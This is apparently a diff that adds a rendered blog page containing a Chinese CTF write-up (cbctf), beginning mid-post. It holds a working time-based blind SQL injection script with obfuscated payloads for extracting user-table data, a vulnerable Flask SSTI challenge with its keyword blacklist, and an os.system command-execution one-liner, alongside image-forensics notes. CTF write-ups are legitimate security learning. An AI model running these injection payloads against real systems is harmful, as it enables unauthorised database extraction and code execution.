+        <span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;&quot;&quot;(case/*2*/when/*2*/&#123;&#125;&gt;/*2*/BINARY/*2*/&#123;&#125;/*2*/then/*2*/1/*2*/else/*2*/(SELECT/*2*/count(*)/*2*/FROM/*2*/user/*2*/A/*2*/inner/*2*/join/*2*/user/*2*/B/*2*/inner/*2*/join/*2*/user/*2*/C/*2*/inner/*2*/join/*2*/user/*2*/D/*2*/inner/*2*/join/*2*/user/*2*/E/*2*/inner/*2*/join/*2*/user/*2*/F/*2*/inner/*2*/join/*2*/user/*2*/G/*2*/inner/*2*/join/*2*/user/*2*/H/*2*/inner/*2*/join/*2*/user/*2*/i/*2*/inner/*2*/join/*2*/user/*2*/j/*2*/inner/*2*/join/*2*/user/*2*/k/*2*/inner/*2*/join/*2*/user/*2*/l/*2*/inner/*2*/join/*2*/user/*2*/m/*2*/inner/*2*/join/*2*/user/*2*/n/*2*/inner/*2*/join/*2*/mysql.help_relation/*2*/o/*2*/inner/*2*/join/*2*/mysql.help_relation/*2*/p)/*2*/end);%23&quot;&quot;&quot;</span>
+        pppay=<span class="hljs-string">&quot;0x&quot;</span>+str_to_hex(x+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&quot;~&quot;</span>)
+
+        before_time = time.time()
+        <span class="hljs-keyword">try</span>:
+            r = requests.post(url=url+<span class="hljs-built_in">str</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;(select/*2*/group_concat(`4`)/*2*/from/*2*/(select*from((select/*2*/1)b/*2*/join/*2*/(select/*2*/2)ab/*2*/join/*2*/(select/*2*/3)ac/*2*/join/*2*/(select/*2*/4)ad)/*2*/union/*2*/select/*2*/*/*2*/from/*2*/user)aa)&quot;</span>,pppay),timeout=<span class="hljs-number">6</span>)
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-keyword">pass</span>
+        after_time = time.time()
+        <span class="hljs-comment"># print( r.text)</span>
+        offset = after_time-before_time
+        print(offset,end=<span class="hljs-string">&quot; &quot;</span>)
+        print(x,end=<span class="hljs-string">&quot;&quot;</span>)
+        print(<span class="hljs-built_in">chr</span>(j))
+        <span class="hljs-keyword">if</span> (offset&gt;<span class="hljs-number">5</span>):
+            x=x+<span class="hljs-built_in">chr</span>(j)
+            print(x)
+            <span class="hljs-keyword">break</span></code></pre>
+
+
+
+<h2 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h2><p>给了源码</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory
+app = Flask(__name__)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span>(<span class="hljs-params">s</span>):</span>
+        blacklist = [<span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,
+                     <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;add&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;ord&#x27;</span>, <span class="hljs-string">&#x27;redirect&#x27;</span>, <span class="hljs-string">&#x27;url_for&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;builtin&#x27;</span>, <span class="hljs-string">&#x27;get_flashed_messages&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;form&#x27;</span>, <span class="hljs-string">&#x27;cookies&#x27;</span>, <span class="hljs-string">&#x27;headers&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>]
+        flag = <span class="hljs-literal">True</span>
+        <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:
+            <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> s.lower():
+                flag = <span class="hljs-literal">False</span>
+                <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">return</span> flag
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()
+    <span class="hljs-keyword">elif</span> safe_jinja(request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)):
+        name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)
+    <span class="hljs-keyword">else</span>:
+        name = <span class="hljs-string">&#x27;wendell&#x27;</span>
+    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    &lt;div class=&quot;center-content&quot;&gt;</span>
+<span class="hljs-string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span>
+<span class="hljs-string">    &lt;/div&gt;</span>
+<span class="hljs-string">    &lt;!--flag in /flag--&gt;</span>
+<span class="hljs-string">    &lt;!--python3.8--&gt;</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span> % (name)
+    <span class="hljs-keyword">return</span> render_template_string(template)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)
+</code></pre>
+
+<p>SSTI过滤了非常多的东西</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/164896822">https://zhuanlan.zhihu.com/p/164896822</a></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="α层"><a href="#α层" class="headerlink" title="α层"></a>α层</h2><p>两张图片一叠，抄下y老师脚本</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
+
+alpha = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;alpha.png&quot;</span>)
+
+flag = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flags.png&quot;</span>)
+
+new_img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, flag.size, (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(flag.size[<span class="hljs-number">0</span>]):
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(flag.size[<span class="hljs-number">1</span>]):
+        <span class="hljs-keyword">if</span> alpha.getpixel((i,j))[<span class="hljs-number">0</span>] != <span class="hljs-number">0</span>:
+            new_img.putpixel((i, j), flag.getpixel((i, j)))
+
+new_img.save(<span class="hljs-string">&quot;new.png&quot;</span>)
+</code></pre>
+
+
+
+<h2 id="python2-人工智障"><a href="#python2-人工智障" class="headerlink" title="python2-人工智障"></a>python2-人工智障</h2><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)</code></pre>
+
+
+
+<h2 id="我的二维码，时尚时尚最时尚"><a href="#我的二维码，时尚时尚最时尚" class="headerlink" title="我的二维码，时尚时尚最时尚"></a>我的二维码，时尚时尚最时尚</h2><p>binwalk 分出两张图片，然后异或</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/cbctf/">cbctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/31/ctfshow-WEB-AK%E8%B5%9B/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctfshow WEB_AK赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/25/D3CTF-2019-Showhub/">
+                        <span class="hidden-mobile">[D3CTF 2019]Showhub</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
